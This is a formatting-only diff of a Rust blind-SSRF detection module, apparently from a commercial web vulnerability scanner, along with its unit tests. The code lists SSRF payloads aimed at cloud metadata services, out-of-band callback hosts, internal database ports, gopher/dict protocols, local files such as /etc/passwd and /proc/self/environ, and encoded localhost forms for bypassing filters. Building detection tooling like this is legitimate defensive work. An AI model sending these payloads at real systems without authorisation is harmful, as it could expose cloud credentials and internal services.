@@ -8,7 +8,6 @@
  * @copyright 2026 Bountyy Oy
  * @license Proprietary - Enterprise Edition
  */
-
 use crate::detection_helpers::AppCharacteristics;
 use crate::http_client::{HttpClient, HttpResponse};
 use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
@@ -57,7 +56,10 @@ impl SsrfBlindScanner {
         let baseline = match self.http_client.get(base_url).await {
             Ok(response) => {
                 let baseline_duration = baseline_start.elapsed();
-                debug!("[SSRF-Blind] Baseline response time: {:?}", baseline_duration);
+                debug!(
+                    "[SSRF-Blind] Baseline response time: {:?}",
+                    baseline_duration
+                );
                 Some((response, baseline_duration))
             }
             Err(e) => {
@@ -72,9 +74,19 @@ impl SsrfBlindScanner {
             tests_run += 1;
 
             let test_url = if base_url.contains('?') {
-                format!("{}&{}={}", base_url, parameter, urlencoding::encode(payload))
+                format!(
+                    "{}&{}={}",
+                    base_url,
+                    parameter,
+                    urlencoding::encode(payload)
+                )
             } else {
-                format!("{}?{}={}", base_url, parameter, urlencoding::encode(payload))
+                format!(
+                    "{}?{}={}",
+                    base_url,
+                    parameter,
+                    urlencoding::encode(payload)
+                )
             };
 
             debug!("[SSRF-Blind] Testing payload: {} -> {}", parameter, payload);
@@ -149,66 +161,66 @@ impl SsrfBlindScanner {
             format!("http://{}.dns.oob.test/", callback_id),
             format!("http://{}.callback.internal/", callback_id),
             format!("https://{}.dns-probe.burpcollaborator.net/", callback_id),
-
             // HTTP callbacks with unique identifiers
             format!("http://callback.server.test/{}/?param=value", callback_id),
             format!("http://oob.bountyy.fi/callback/{}?test=1", callback_id),
-
             // AWS Metadata with callback tracking
-            format!("http://169.254.169.254/latest/meta-data?callback={}", callback_id),
-            format!("http://169.254.169.254/latest/user-data/?id={}", callback_id),
-
+            format!(
+                "http://169.254.169.254/latest/meta-data?callback={}",
+                callback_id
+            ),
+            format!(
+                "http://169.254.169.254/latest/user-data/?id={}",
+                callback_id
+            ),
             // GCP Metadata with callback tracking
-            format!("http://metadata.google.internal/computeMetadata/v1/?id={}", callback_id),
+            format!(
+                "http://metadata.google.internal/computeMetadata/v1/?id={}",
+                callback_id
+            ),
             format!("http://metadata.google.internal/?callback={}", callback_id),
-
             // Azure Metadata with callback tracking
-            format!("http://169.254.169.254/metadata/instance?api-version=2021-02-01&callback={}", callback_id),
-
+            format!(
+                "http://169.254.169.254/metadata/instance?api-version=2021-02-01&callback={}",
+                callback_id
+            ),
             // Alternative protocols that cause delays (blind SSRF indicators)
             format!("gopher://{}.internal:80/_", callback_id),
             format!("dict://{}.internal:11211/", callback_id),
             format!("ldap://{}.internal:389/", callback_id),
             format!("ftp://{}.internal:21/", callback_id),
-
             // Slow/hanging endpoints (timing-based detection)
             "http://169.254.169.254/latest/meta-data/".to_string(),
             "http://metadata.google.internal/computeMetadata/v1/".to_string(),
-
             // Internal network endpoints (may cause delays)
-            "http://127.0.0.1:22".to_string(),  // SSH
-            "http://127.0.0.1:3306".to_string(), // MySQL
-            "http://127.0.0.1:5432".to_string(), // PostgreSQL
-            "http://127.0.0.1:6379".to_string(), // Redis
-            "http://127.0.0.1:9200".to_string(), // Elasticsearch
+            "http://127.0.0.1:22".to_string(),    // SSH
+            "http://127.0.0.1:3306".to_string(),  // MySQL
+            "http://127.0.0.1:5432".to_string(),  // PostgreSQL
+            "http://127.0.0.1:6379".to_string(),  // Redis
+            "http://127.0.0.1:9200".to_string(),  // Elasticsearch
             "http://127.0.0.1:27017".to_string(), // MongoDB
-
             // Private network ranges (timing indicators)
             "http://10.0.0.1:80".to_string(),
             "http://172.16.0.1:80".to_string(),
             "http://192.168.1.1:80".to_string(),
-
             // File protocol (may cause errors or delays)
             "file:///etc/passwd".to_string(),
             "file:///etc/hosts".to_string(),
             "file:///proc/self/environ".to_string(),
             "file:///c:/windows/win.ini".to_string(),
-
             // Kubernetes/Cloud service endpoints (blind SSRF common targets)
             "http://kubernetes.default.svc/api/v1/namespaces/default/pods".to_string(),
             "http://consul.service.consul:8500/v1/catalog/services".to_string(),
             "http://rancher-metadata.rancher.internal/latest".to_string(),
-
             // DNS rebinding prevention bypass with callbacks
             format!("http://{}.localtest.me/", callback_id),
             format!("http://{}.lvh.me/", callback_id),
-
             // Alternative IP representations (may cause different timing)
-            "http://0177.0.0.1:80".to_string(),      // Octal
-            "http://2130706433:80".to_string(),       // Decimal
-            "http://0x7f000001:80".to_string(),       // Hexadecimal
-            "http://[::1]:80".to_string(),            // IPv6 localhost
-            "http://127.1:80".to_string(),            // Shortened localhost
+            "http://0177.0.0.1:80".to_string(), // Octal
+            "http://2130706433:80".to_string(), // Decimal
+            "http://0x7f000001:80".to_string(), // Hexadecimal
+            "http://[::1]:80".to_string(),      // IPv6 localhost
+            "http://127.1:80".to_string(),      // Shortened localhost
         ]
     }
 
@@ -242,7 +254,8 @@ impl SsrfBlindScanner {
         // Check if response changed from baseline
         let response_changed = response.body != baseline_response.body;
         let size_diff = (response.body.len() as i64 - baseline_response.body.len() as i64).abs();
-        let significant_change = size_diff > 50 || response.status_code != baseline_response.status_code;
+        let significant_change =
+            size_diff > 50 || response.status_code != baseline_response.status_code;
 
         // 1. TIMING-BASED DETECTION (Primary method for blind SSRF)
         // If request takes significantly longer than baseline, possible blind SSRF
@@ -374,11 +387,12 @@ impl SsrfBlindScanner {
 
         // 5. PROTOCOL-SPECIFIC DETECTION
         // Different protocols may cause different behaviors
-        if (payload.starts_with("gopher://") ||
-            payload.starts_with("dict://") ||
-            payload.starts_with("ldap://") ||
-            payload.starts_with("ftp://")) && significant_change {
-
+        if (payload.starts_with("gopher://")
+            || payload.starts_with("dict://")
+            || payload.starts_with("ldap://")
+            || payload.starts_with("ftp://"))
+            && significant_change
+        {
             // Alternative protocols with response change indicates SSRF processing
             return Some(self.create_vulnerability(
                 parameter,
@@ -444,10 +458,11 @@ impl SsrfBlindScanner {
 
         // Timeout errors on metadata/internal endpoints
         if error_msg.contains("timeout") && request_ms > 5000 {
-            if payload.contains("169.254.169.254") ||
-               payload.contains("metadata") ||
-               payload.contains("127.0.0.1") ||
-               payload.contains("localhost") {
+            if payload.contains("169.254.169.254")
+                || payload.contains("metadata")
+                || payload.contains("127.0.0.1")
+                || payload.contains("localhost")
+            {
                 return Some(self.create_vulnerability(
                     parameter,
                     payload,
@@ -469,7 +484,7 @@ impl SsrfBlindScanner {
     /// Check if payload targets known SSRF destinations
     fn is_ssrf_target_payload(&self, payload: &str) -> bool {
         let ssrf_targets = [
-            "169.254.169.254",  // AWS/Azure metadata
+            "169.254.169.254", // AWS/Azure metadata
             "metadata.google.internal",
             "metadata",
             "127.0.0.1",
@@ -578,34 +593,54 @@ mod tests {
 
     #[tokio::test]
     async fn test_blind_ssrf_payload_generation() {
-        let scanner = SsrfBlindScanner::new(Arc::new(
-            HttpClient::new(5, 2).unwrap()
-        ));
+        let scanner = SsrfBlindScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));
 
         let payloads = scanner.generate_blind_ssrf_payloads();
 
         // Should have comprehensive payload set with unique callback IDs
-        assert!(payloads.len() >= 30, "Should have at least 30 blind SSRF payloads");
+        assert!(
+            payloads.len() >= 30,
+            "Should have at least 30 blind SSRF payloads"
+        );
 
         // Check for critical payload types
-        assert!(payloads.iter().any(|p| p.contains("dns.oob.test")), "Missing DNS OOB payload");
-        assert!(payloads.iter().any(|p| p.contains("169.254.169.254")), "Missing AWS metadata");
-        assert!(payloads.iter().any(|p| p.contains("metadata.google.internal")), "Missing GCP metadata");
-        assert!(payloads.iter().any(|p| p.contains("gopher://")), "Missing gopher:// protocol");
-        assert!(payloads.iter().any(|p| p.contains("dict://")), "Missing dict:// protocol");
+        assert!(
+            payloads.iter().any(|p| p.contains("dns.oob.test")),
+            "Missing DNS OOB payload"
+        );
+        assert!(
+            payloads.iter().any(|p| p.contains("169.254.169.254")),
+            "Missing AWS metadata"
+        );
+        assert!(
+            payloads
+                .iter()
+                .any(|p| p.contains("metadata.google.internal")),
+            "Missing GCP metadata"
+        );
+        assert!(
+            payloads.iter().any(|p| p.contains("gopher://")),
+            "Missing gopher:// protocol"
+        );
+        assert!(
+            payloads.iter().any(|p| p.contains("dict://")),
+            "Missing dict:// protocol"
+        );
 
         // Verify callback IDs are present in payloads
-        let callback_payloads: Vec<&String> = payloads.iter()
+        let callback_payloads: Vec<&String> = payloads
+            .iter()
             .filter(|p| p.contains("callback") || p.contains("oob") || p.contains(".internal"))
             .collect();
-        assert!(!callback_payloads.is_empty(), "Should have callback payloads with unique IDs");
+        assert!(
+            !callback_payloads.is_empty(),
+            "Should have callback payloads with unique IDs"
+        );
     }
 
     #[test]
     fn test_unique_callback_id_generation() {
-        let scanner = SsrfBlindScanner::new(Arc::new(
-            HttpClient::new(5, 2).unwrap()
-        ));
+        let scanner = SsrfBlindScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));
 
         let id1 = scanner.generate_unique_callback_id();
         let id2 = scanner.generate_unique_callback_id();
@@ -614,14 +649,15 @@ mod tests {
         assert_ne!(id1, id2, "Callback IDs should be unique");
 
         // IDs should be reasonable length
-        assert!(id1.len() >= 16, "Callback ID should be at least 16 characters");
+        assert!(
+            id1.len() >= 16,
+            "Callback ID should be at least 16 characters"
+        );
     }
 
     #[test]
     fn test_timing_based_detection() {
-        let scanner = SsrfBlindScanner::new(Arc::new(
-            HttpClient::new(5, 2).unwrap()
-        ));
+        let scanner = SsrfBlindScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));
 
         let baseline = HttpResponse {
             status_code: 200,
@@ -655,9 +691,7 @@ mod tests {
 
     #[test]
     fn test_callback_indicator_detection() {
-        let scanner = SsrfBlindScanner::new(Arc::new(
-            HttpClient::new(5, 2).unwrap()
-        ));
+        let scanner = SsrfBlindScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));
 
         let baseline = HttpResponse {
             status_code: 200,
@@ -690,9 +724,7 @@ mod tests {
 
     #[test]
     fn test_is_ssrf_target_payload() {
-        let scanner = SsrfBlindScanner::new(Arc::new(
-            HttpClient::new(5, 2).unwrap()
-        ));
+        let scanner = SsrfBlindScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));
 
         assert!(scanner.is_ssrf_target_payload("http://169.254.169.254/latest/meta-data/"));
         assert!(scanner.is_ssrf_target_payload("http://metadata.google.internal/"));
@@ -706,9 +738,7 @@ mod tests {
 
     #[test]
     fn test_no_false_positive_on_normal_response() {
-        let scanner = SsrfBlindScanner::new(Arc::new(
-            HttpClient::new(5, 2).unwrap()
-        ));
+        let scanner = SsrfBlindScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));
 
         let baseline = HttpResponse {
             status_code: 200,
@@ -734,6 +764,9 @@ mod tests {
             std::time::Duration::from_millis(100),
         );
 
-        assert!(result.is_none(), "Should not report false positive on normal response");
+        assert!(
+            result.is_none(),
+            "Should not report false positive on normal response"
+        );
     }
 }
